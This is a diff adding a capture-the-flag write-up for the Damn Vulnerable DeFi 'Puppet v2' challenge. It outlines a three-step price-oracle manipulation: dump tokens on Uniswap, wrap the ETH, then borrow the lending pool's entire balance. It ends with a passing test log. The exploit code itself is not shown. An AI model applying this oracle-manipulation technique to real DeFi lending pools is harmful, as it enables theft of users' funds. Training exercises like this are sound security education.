@@ -1,3 +1,46 @@
+# Damn Vulnerable DeFi (Foundry version)
+
+- [Scope](#scope)
+- [Plan](#plan)
+- [Solution](#solution)
+  - [Proof of Concept](#proof-of-concept)
+
+## Challenge #9 - Puppet v2 - Description
+
+The developers of the last lending pool are saying that they've learned the lesson. And just released a new version!
+
+Now they're using a Uniswap v2 exchange as a price oracle, along with the recommended utility libraries. That should be enough.
+
+You start with 20 ETH and 10000 DVT tokens in balance. The new lending pool has a million DVT tokens in balance. You know what to do ;)
+
+## Scope
+
+| File Name                                                                 | SHA-1 Hash                               |
+| ------------------------------------------------------------------------- | ---------------------------------------- |
+| damn-vulnerable-defi-foundry/src/Contracts/puppet-v2/Interfaces.sol       | a0fd58cda9b1368763a82fb7eeb2688dc22f588b |
+| damn-vulnerable-defi-foundry/src/Contracts/puppet-v2/IUniswapV2Pair.sol   | 4d50fe6ddb44138b1d3e90d88a88d943ab612d6a |
+| damn-vulnerable-defi-foundry/src/Contracts/puppet-v2/PuppetV2Pool.sol     | 81d8ca264bcf31c026e78f3eb34c71afc4780b4e |
+| damn-vulnerable-defi-foundry/src/Contracts/puppet-v2/UniswapV2Library.sol | 113cef9d817c64bc46513b6daa119a22fd81bb7f |
+
+## Plan
+
+More or less the same plan as in Challenge #8 - Puppet.
+
+## Solution
+
+1.  Give all of our DVTs for ETH through Uniswap.
+2.  Change ETH to WETH.
+3.  Borrow all the DVTs from the pool.
+
+<details>
+    <summary>Description</summary>
+
+</details>
+
+<details>
+    <summary>damn-vulnerable-defi-foundry/test/Levels/puppet-v2/PuppetV2.t.sol</summary>
+
+```solidity
 // SPDX-License-Identifier: MIT
 pragma solidity >=0.8.0;
 
@@ -133,3 +176,25 @@ contract PuppetV2 is Test {
         assertEq(dvt.balanceOf(address(puppetV2Pool)), 0);
     }
 }
+```
+
+</details>
+
+### Proof of Concept
+
+```
+./run.sh 9
+[⠆] Compiling...
+[⠢] Compiling 1 files with 0.8.17
+[⠆] Solc 0.8.17 finished in 855.78ms
+Compiler run successful
+
+Running 1 test for test/Levels/puppet-v2/PuppetV2.t.sol:PuppetV2
+[PASS] testExploit() (gas: 233646)
+Logs:
+  🧨 Let's see if you can break it... 🧨
+
+🎉 Congratulations, you can go to the next level! 🎉
+
+Test result: ok. 1 passed; 0 failed; finished in 3.99ms
+```
